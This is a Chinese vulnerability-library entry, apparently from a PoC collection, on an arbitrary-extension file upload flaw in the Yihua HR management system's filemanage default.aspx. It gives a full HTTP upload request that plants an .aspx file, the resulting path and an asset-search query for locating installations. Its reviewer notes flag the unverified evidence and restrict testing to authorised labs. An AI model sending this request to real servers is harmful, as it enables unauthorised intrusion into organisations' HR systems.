---
source: "wy876 漏洞文库"
title: "亿华人力资源管理系统 filemanage default.aspx任意后缀上传"
product: "亿华人力资源管理系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；WebForms VIEWSTATE/会话及ASPX解析条件"
prerequisites: "样例带SessionId，未说明匿名与已认证"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/elmyeuhlruvlkvox"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E4%BA%BF%E5%8D%8E%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E4%BA%BF%E5%8D%8E%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Ffilemanage%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.body="
hunter: "web.body=\"亿华人力资源管理系统\""
id: "vw-0480a19836c3b683fe4d4c53"
entity_id: "ve-0480a19836c3b683fe4d4c53"
schema_version: "1"
---

# 亿华人力资源管理系统 filemanage default.aspx任意后缀上传

## 条目说明

- 对象与具体问题：亿华人力资源管理系统；filemanage default.aspx任意后缀上传
- 版本、配置及部署条件：版本未知；WebForms VIEWSTATE/会话及ASPX解析条件
- 认证与权限前提：样例带SessionId，未说明匿名与已认证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- VIEWSTATE固定且MAC部署相关，应先取目标页面状态；multipart最终边界缺--
- 上传内容123只能证明写入/访问不证明ASPX代码执行，获取服务器权限超出样例证据
- /FilesUpload/2.aspx为预期路径，无文字响应/执行证据；与205不同上传处理页面
- Hunter元数据混FOFA，补修复和厂商版本

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
亿华人力资源管理系统是一款全面的人力资源管理软件，旨在帮助企业实现员工档案管理规范化、薪资管理自动化、招聘管理流程化等目标。该系统涵盖了人力资源管理的各个方面，包括员工档案管理、薪资管理、招聘管理、培训管理、福利管理等。亿华人力资源管理系统filemanage存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

## 二、影响版本
+ 亿华人力资源管理系统

## 三、资产测绘
+ hunter`web.body="亿华人力资源管理系统"`
+ 特征


## 四、漏洞复现
```http
POST /filemanage/file/default.aspx HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------13611309432955470360700636523
Content-Length: 1170
Connection: close
Cookie: ASP.NET_SessionId=2g3mplfduhthivdwifteza3q
Upgrade-Insecure-Requests: 1

-----------------------------13611309432955470360700636523
Content-Disposition: form-data; name="__VIEWSTATE"

/wEPDwULLTEzNjk1NjQwNjYPZBYCAgMPZBYGAgEPDxYCHgRUZXh0BQ0vRmlsZXNVcGxvYWQvZGQCAw8PFgIeB1Zpc2libGVoZGQCBA8PFgIfAWhkZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAQUIQXV0b05hbWWy1sk+LR5PsSft3vRvaTFxMKfM4/Mdc2SRqdis5w3/ag==
-----------------------------13611309432955470360700636523
Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"

5338F018
-----------------------------13611309432955470360700636523
Content-Disposition: form-data; name="fileToUpload"; filename="2.aspx"
Content-Type: image/png

123
-----------------------------13611309432955470360700636523
Content-Disposition: form-data; name="UploadBtn"

上传文件
-----------------------------13611309432955470360700636523
```

> 请求长度说明：原资料 Content-Length 为 1170；保留原始标头；其数值未据实际请求体重新计算或验证。


上传文件位置

```plain
/FilesUpload/2.aspx
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/elmyeuhlruvlkvox>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
